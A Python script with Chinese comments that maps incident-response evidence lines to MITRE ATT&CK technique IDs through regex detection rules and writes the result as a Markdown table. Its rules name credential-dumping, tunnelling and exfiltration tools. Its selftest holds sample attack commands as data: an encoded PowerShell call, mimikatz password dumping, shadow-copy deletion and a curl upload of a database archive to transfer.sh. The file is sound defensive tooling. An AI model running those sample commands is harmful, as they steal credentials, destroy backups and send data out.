#!/usr/bin/env python3
"""现场证据 → ATT&CK T-ID 映射（只读文本分析，不执行任何命令）。

用法:
  python3 ttp_map.py --in evidence.txt --out ttp.md
  cat evidence.txt | python3 ttp_map.py --stdin
  python3 ttp_map.py --selftest

输入: 每行一条证据（命令、日志片段、文件路径、进程名均可）。
输出: 按战术阶段排序的 Markdown 表 + 缺口（哪些战术阶段无证据）。
注意: 这是**线索映射**，不是定论；报告里的 T-ID 必须配证据单元（时间/主机/命令/检测命中）。
"""
import argparse, json, re, sys

TACTICS = ["侦察", "资源开发", "初始访问", "执行", "持久化", "提权", "防御规避", "凭据访问",
           "发现", "横向移动", "收集", "命令与控制", "外泄", "影响"]

# (T-ID, 名称, 战术, 正则)
RULES = [
    ("T1595", "主动扫描", "侦察", r"\b(masscan|nmap|zmap|nuclei|dirsearch|gobuster|ffuf|wfuzz|whatweb)\b"),
    ("T1590", "网络信息收集", "侦察", r"(censys|shodan|fofa|quake|securitytrails|crt\.sh|证书透明)"),
    ("T1592", "主机信息收集", "侦察", r"(banner grab|http.*Server:|favicon.*hash)"),
    ("T1190", "公网应用利用", "初始访问", r"(union\s+select|\.\./\.\./|/actuator|CVE-\d{4}-\d{3,5}|sqlmap|/console/login)"),
    ("T1566", "钓鱼", "初始访问", r"(phish|钓鱼|attachment\.(zip|docm|xlsm)|macro|\.lnk\b)"),
    ("T1078", "有效账号", "初始访问", r"(4624|成功登录.*异常|Valid Accounts|vpn 登录|rdp 登录成功)"),
    ("T1059.001", "PowerShell", "执行", r"(powershell|Invoke-Expression|IEX\s*\(|-enc(odedcommand)?\b|DownloadString)"),
    ("T1059.003", "cmd", "执行", r"(cmd\.exe|cmd\s*/c|%comspec%)"),
    ("T1059.004", "Unix Shell", "执行", r"(bash\s+-c|/bin/sh|sh\s+-c|zsh\s+-c)"),
    ("T1059.005", "Python/脚本", "执行", r"(python[23]?\s+-c|perl\s+-e|ruby\s+-e|php\s+-r)"),
    ("T1053", "计划任务/cron", "执行", r"(schtasks|at\.exe|crontab|\bat\s+\d{1,2}:|systemd-run)"),
    ("T1204", "用户执行", "执行", r"(双击|user execution|macro enabled|\.js\b.*执行)"),
    ("T1543", "服务/守护进程", "持久化", r"(sc\s+create|New-Service|systemctl\s+(enable|start)|/etc/init\.d|launchctl)"),
    ("T1547", "启动项/注册表", "持久化", r"(\\CurrentVersion\\Run|HKLM.*Run|startup folder|\.config/autostart)"),
    ("T1505.003", "Web Shell", "持久化", r"(webshell|eval\s*\(|assert\s*\(|Runtime\.getRuntime|addFilterDef|\$_(POST|GET)\[.+(cmd|exec))"),
    ("T1136", "创建账号", "持久化", r"(net\s+user\s+\S+\s+/add|useradd|adduser|New-LocalUser)"),
    ("T1068", "漏洞提权", "提权", r"(提权|SeImpersonate|CVE-\d{4}-\d{3,5}.*(priv|提权)|potato)"),
    ("T1548", "UAC 绕过", "提权", r"(fodhelper|eventvwr.*bypass|UAC\s*bypass|alwaysinstallelevated)"),
    ("T1134", "令牌窃取", "提权", r"(SeDebugPrivilege|impersonate|token\s+窃取|steal_token)"),
    ("T1070", "痕迹清除", "防御规避", r"(wevtutil\s+cl|Clear-EventLog|rm\s+-rf\s+.*log|shred|日志删除|history\s+-c)"),
    ("T1027", "混淆", "防御规避", r"(-enc(odedcommand)?\b|FromBase64String|base64\s+-d|str_rot13|chr\(\d+\))"),
    ("T1562", "削弱防御", "防御规避", r"(Set-MpPreference|AMSI|netsh\s+advfirewall\s+set.*disable|stop\s+.*(defend|av)|关闭杀软)"),
    ("T1218", "系统代理执行", "防御规避", r"(rundll32|regsvr32|mshta|certutil\s+-urlcache|msbuild)"),
    ("T1003.001", "LSASS 转储", "凭据访问", r"(lsass|procdump|mimikatz|sekurlsa|MiniDump|comsvcs\.dll)"),
    ("T1110", "爆破", "凭据访问", r"(hydra|medusa|ncrack|crowbar|4625|failed password|爆破|撞库)"),
    ("T1552", "文件内凭据", "凭据访问", r"(\.env|id_rsa|\.aws/credentials|config\.php|web\.config|kubeconfig|备份.*(sql|zip))"),
    ("T1555", "密码存储", "凭据访问", r"(Login Data|key3\.db|logins\.json|Credential Manager|credential dump)"),
    ("T1046", "服务扫描", "发现", r"(端口扫描|netstat\s+-ano|nmap\s+-p|masscan)"),
    ("T1087", "账号发现", "发现", r"(net\s+user\b|net\s+group|whoami|ldapsearch|Get-ADUser)"),
    ("T1082", "系统信息", "发现", r"(systeminfo|uname\s+-a|whoami\s+/all|ipconfig\s+/all)"),
    ("T1018", "远程系统发现", "发现", r"(net\s+view|arp\s+-a|ping\s+-n\s+.*192\.|nbtscan)"),
    ("T1021.001", "RDP", "横向移动", r"(mstsc|3389|RDP\s+登录|xfreerdp)"),
    ("T1021.002", "SMB/PsExec", "横向移动", r"(psexec|smbexec|net\s+use\s+\\\\|ADMIN\$\s*|445)"),
    ("T1021.006", "WinRM", "横向移动", r"(winrm|Enter-PSSession|Invoke-Command\s+-ComputerName|5985)"),
    ("T1570", "工具传输", "横向移动", r"(scp\s+|smbclient\s+.*put|复制.*\.exe\s*到.*共享)"),
    ("T1005", "本地数据收集", "收集", r"(tar\s+-czf|zip\s+-r|Get-ChildItem\s+-Recurse|find\s+/.*-name|打包)"),
    ("T1114", "邮件收集", "收集", r"(邮件导出|export.*mailbox|\.pst\b|\.eml\b)"),
    ("T1071.001", "Web C2", "命令与控制", r"(beacon|心跳|User-Agent.*payload|/api/v\d.*(cmd|task)|jquery.*c2)"),
    ("T1071.004", "DNS C2", "命令与控制", r"(dns\s*tunnel|dnscat|iodine|nslookup.*\.(top|xyz|duckdns))"),
    ("T1573", "加密通道", "命令与控制", r"(JA3|自签证书.*外连|TLS\s+tunnel|openssl\s+s_client)"),
    ("T1090", "代理", "命令与控制", r"(socks5|proxychains|ngrok|frp|chisel|ligolo|reGeorg)"),
    ("T1105", "工具下载", "命令与控制", r"(wget\s+|curl\s+-O|certutil\s+-urlcache|bitsadmin|Invoke-WebRequest)"),
    ("T1041", "C2 外泄", "外泄", r"(外传|upload.*base64|curl\s+-F\s+@|POST\s+.*\.zip)"),
    ("T1567", "Web 服务外泄", "外泄", r"(pastebin|transfer\.sh|file\.io|网盘上传|0x0\.st)"),
    ("T1486", "数据加密", "影响", r"(ransom|\.locked\b|README.*(解密|decrypt)|文件被加密)"),
    ("T1490", "抑制恢复", "影响", r"(vssadmin\s+delete\s+shadows|wbadmin\s+delete|bcdedit.*recoveryenabled\s+no)"),
    ("T1489", "停止服务", "影响", r"(Stop-Service|sc\s+stop|kill\s+.*(mysql|nginx|tomcat))"),
    ("T1498", "DDoS", "影响", r"(hping3|slowloris|syn\s*flood|ab\s+-n|wrk\s+-t|CC 攻击)"),
]


def map_lines(lines):
    hits = {}
    for i, line in enumerate(lines, 1):
        for tid, name, tac, pat in RULES:
            if re.search(pat, line, re.I):
                hits.setdefault(tid, {"tid": tid, "name": name, "tactic": tac, "ev": []})
                hits[tid]["ev"].append((i, line.strip()[:160]))
    return hits


def render(hits):
    out = ["| T-ID | 技术 | 战术 | 证据(行号) |", "|------|------|------|-----------|"]
    for tac in TACTICS:
        rows = sorted([h for h in hits.values() if h["tactic"] == tac], key=lambda x: x["tid"])
        for h in rows:
            ev = "; ".join(f"L{i}" for i, _ in h["ev"][:5])
            out.append(f"| {h['tid']} | {h['name']} | {tac} | {ev} |")
    used = {h["tactic"] for h in hits.values()}
    gaps = [t for t in TACTICS if t not in used]
    out.append("")
    out.append(f"**覆盖战术**: {len(used)}/{len(TACTICS)}   **T-ID 数**: {len(hits)}")
    out.append(f"**缺口(无证据的战术)**: {'、'.join(gaps) if gaps else '无'}")
    out.append("")
    out.append("> 线索映射，非定论：每条 T-ID 需人工补 时间/主机/账号/检测是否命中。")
    return "\n".join(out)


def selftest():
    sample = [
        "powershell.exe -enc SQBFAFgA...", "schtasks /create /tn up /tr x.exe /sc onlogon",
        "mimikatz sekurlsa::logonpasswords", "vssadmin delete shadows /all /quiet",
        "nmap -p 1-65535 10.0.0.1", "curl -F @/tmp/db.zip http://transfer.sh/up",
    ]
    hits = map_lines(sample)
    want = ["T1059.001", "T1053", "T1003.001", "T1490", "T1595"]
    miss = [w for w in want if w not in hits]
    print(f"# selftest: 命中 T-ID {len(hits)} 个: {sorted(hits)}")
    if miss:
        print(f"# FAIL: 未命中 {miss}")
        return 1
    assert "T1567" in hits or "T1041" in hits, hits
    print("# PASS: 映射可用（含外泄类）")
    print(render(hits)[:600])
    return 0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--in", dest="inp")
    ap.add_argument("--stdin", action="store_true")
    ap.add_argument("--out")
    ap.add_argument("--json", dest="json_out")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        sys.exit(selftest())
    if a.stdin or not a.inp:
        lines = sys.stdin.read().splitlines()
    else:
        lines = open(a.inp, "r", encoding="utf-8", errors="ignore").read().splitlines()
    hits = map_lines(lines)
    md = render(hits)
    print(md)
    if a.out:
        open(a.out, "w", encoding="utf-8").write("# ATT&CK TTP 映射\n\n" + md + "\n")
        print(f"\n# 已写: {a.out}")
    if a.json_out:
        json.dump(list(hits.values()), open(a.json_out, "w", encoding="utf-8"),
                  ensure_ascii=False, indent=2)
        print(f"# JSON: {a.json_out}")


if __name__ == "__main__":
    main()
